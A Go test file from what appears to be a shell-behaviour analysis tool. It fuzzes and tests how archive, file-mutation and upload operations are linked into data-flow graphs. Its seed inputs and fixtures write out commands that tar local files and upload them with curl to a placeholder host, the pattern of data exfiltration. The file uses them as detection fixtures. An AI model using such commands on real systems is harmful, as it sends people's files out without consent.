package extract

import (
	"fmt"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func FuzzShellPathFlow(f *testing.F) {
	for _, source := range []string{
		"tar -czf './inert.tgz' /tmp/inert-input\ncd /tmp/other\ncurl -T ./inert.tgz https://example.invalid/upload",
		"p=~/inert.tgz\ntar -czf \"$p\" /tmp/inert-input",
		"tar -czf '~/inert.tgz' /tmp/inert-input; curl -T ~/inert.tgz https://example.invalid/upload",
		"cd /tmp/inert |\nHOME='unterminated",
	} {
		f.Add(source)
	}
	f.Fuzz(func(t *testing.T, source string) {
		if len(source) > 16<<10 {
			return
		}
		graph := behavior.Graph{EvidenceLimit: 512, ItemLimit: 512, StringByteLimit: 1 << 20}
		scope := graph.AddScope(behavior.Scope{NodeID: "node", Kind: "program"})
		ExtractText(&graph, artifact.Content{NodeID: "node", ScopeID: scope, LogicalPath: "fixture.sh", Kind: "script", SemanticLanguage: "shell", Data: []byte(source)})
		LinkOperationRelations(&graph)
		if len(graph.Operations) > 512 || len(graph.Relations) > 512 {
			t.Fatal("path flow exceeded the graph budget")
		}
	})
}

func TestShellDirectoryContextBudgetCannotReuseAnExistingProof(t *testing.T) {
	state := newTextVariableState()
	var graph behavior.Graph
	first := state.directoryContext(&graph, "first")
	for index := 1; index < maxTextTrackedVariables; index++ {
		state.directoryContext(&graph, fmt.Sprint(index))
	}
	if context := state.directoryContext(&graph, "excess"); context.working != 0 || context.home != 0 {
		t.Fatal("exhausted context budget returned a usable proof")
	}
	if context := state.directoryContext(&graph, "first"); context != first {
		t.Fatal("context exhaustion changed a retained independent proof")
	}
	if state.omittedDetail == "" {
		t.Fatal("context exhaustion was not reported")
	}
}

func TestShellConflictingPathInterpretationsRemainUnknown(t *testing.T) {
	fields, raw, err := shellCommandFieldsRaw(`printf '%s' ~/inert '~/inert' ~/inert`)
	if err != nil {
		t.Fatal(err)
	}
	if mode := shellPathInterpretations(fields, raw)["~/inert"]; mode != behavior.FilePathUnknown {
		t.Fatal("a repeated word overwrote conflicting expansion provenance")
	}
}

func TestUnknownFileMutationInvalidatesProvenFlow(t *testing.T) {
	for _, test := range []struct {
		name         string
		kind         behavior.OperationKind
		role         behavior.ResourceRole
		order        int
		otherContext bool
		flow         bool
	}{
		{"unknown write", behavior.OperationFileWrite, behavior.ResourceRoleLocalOutput, 3, false, false},
		{"unknown delete", behavior.OperationFileDelete, behavior.ResourceRoleTarget, 3, false, false},
		{"unknown copy", behavior.OperationFileCopy, behavior.ResourceRoleLocalOutput, 3, false, false},
		{"unknown move", behavior.OperationFileMove, behavior.ResourceRoleTarget, 3, false, false},
		{"earlier mutation", behavior.OperationFileWrite, behavior.ResourceRoleLocalOutput, 1, false, true},
		{"later mutation", behavior.OperationFileWrite, behavior.ResourceRoleLocalOutput, 5, false, true},
		{"other root", behavior.OperationFileWrite, behavior.ResourceRoleLocalOutput, 3, true, true},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			execution := testConnectedExecution("root")
			graph.AddOperation(behavior.ModeledOperation{
				SubjectNodeID: "node", ScopeID: "scope", Kind: behavior.OperationArchiveCreate,
				ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/inert.tgz")), behavior.Bind(behavior.ResourceRoleSource, behavior.NewResource(behavior.ResourceFile, "/tmp/inert-input"))),
				EvidenceIDs:      []string{"ev-archive"}, Support: behavior.SupportCorroborated,
				Execution: execution, SourceOrderGroup: 1, SourceOrdinal: 2,
			})
			mutationExecution := execution
			if test.otherContext {
				mutationExecution = testConnectedExecution("other-root")
			}
			mutationBindings := behavior.Bindings(behavior.Bind(test.role, behavior.NewResource(behavior.ResourceFile, "")))
			if test.kind == behavior.OperationFileCopy || test.kind == behavior.OperationFileMove {
				mutationBindings = append(mutationBindings, behavior.Bind(behavior.ResourceRoleSource, behavior.NewResource(behavior.ResourceFile, "")))
			}
			graph.AddOperation(behavior.ModeledOperation{
				SubjectNodeID: "node", ScopeID: "scope", Kind: test.kind,
				ResourceBindings: mutationBindings,
				EvidenceIDs:      []string{"ev-mutation"}, Support: behavior.SupportCorroborated,
				Execution: mutationExecution, SourceOrderGroup: 1, SourceOrdinal: test.order,
			})
			graph.AddOperation(behavior.ModeledOperation{
				SubjectNodeID: "node", ScopeID: "scope", Kind: behavior.OperationNetworkUpload,
				ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalInput, behavior.NewResource(behavior.ResourceFile, "/tmp/inert.tgz")), behavior.Bind(behavior.ResourceRoleRemoteDestination, behavior.NewResource(behavior.ResourceURL, "https://example.invalid/upload"))),
				EvidenceIDs:      []string{"ev-upload"}, Support: behavior.SupportCorroborated,
				Execution: execution, SourceOrderGroup: 1, SourceOrdinal: 4,
			})
			if len(graph.Operations) != 3 {
				t.Fatalf("invalid fixture operations: %#v", graph.Operations)
			}
			linkTestOperationRelations(&graph)
			if got := hasRelationKind(graph.Relations, behavior.RelationPrecedes); got != test.flow {
				t.Fatalf("flow = %v, want %v: %#v", got, test.flow, graph.Relations)
			}
		})
	}
}
